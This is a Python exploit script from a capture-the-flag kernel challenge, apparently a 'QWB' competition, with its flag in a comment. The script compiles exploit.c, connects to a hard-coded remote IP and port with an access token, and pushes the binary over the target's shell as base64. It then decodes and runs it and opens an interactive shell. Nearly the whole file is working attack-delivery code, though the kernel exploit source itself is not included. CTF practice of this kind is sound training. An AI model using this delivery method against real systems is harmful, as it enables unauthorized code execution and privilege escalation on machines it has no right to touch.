#!/usr/bin/env python
# coding:utf-8

# apt install musl-tools
# ./exploit.py MODE=remote
# QWB{Simp1e_Kern3l_p0wn}

from ctf import *

exe = ['sh', './start.sh']
context.arch = 'amd64'
# context.log_level = 'DEBUG'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir


def exploit():
    os.system('musl-gcc -Os -static -o exploit exploit.c')

    if mode == 'debug':
        io = debug(exe)
        io.b([])
        io.r()
    elif mode == 'remote':
        io = remote('117.50.2.191', 9999)
        io.sendlineafter('Token:', 'icqde8dabd22289554a0a90dd871d6b3')

    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(exe)

    # io.sendlineafter('/ $ ', 'stty -echo')
    io.sendlineafter('/ $ ', 'cat << EOF > exp.b64')
    io.sendline(read('./exploit').encode('base64'))
    io.sendline('EOF')
    io.sendlineafter('$ ', 'base64 -d exp.b64 > exp')
    io.sendlineafter('$ ', 'chmod +x exp')
    # io.sendlineafter('$ ', 'stty +echo')

    io.sendlineafter('$ ', './exp')

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''
        #'''.strip().split('\n'))

    io.interactive()


if __name__ == '__main__':
    exploit()
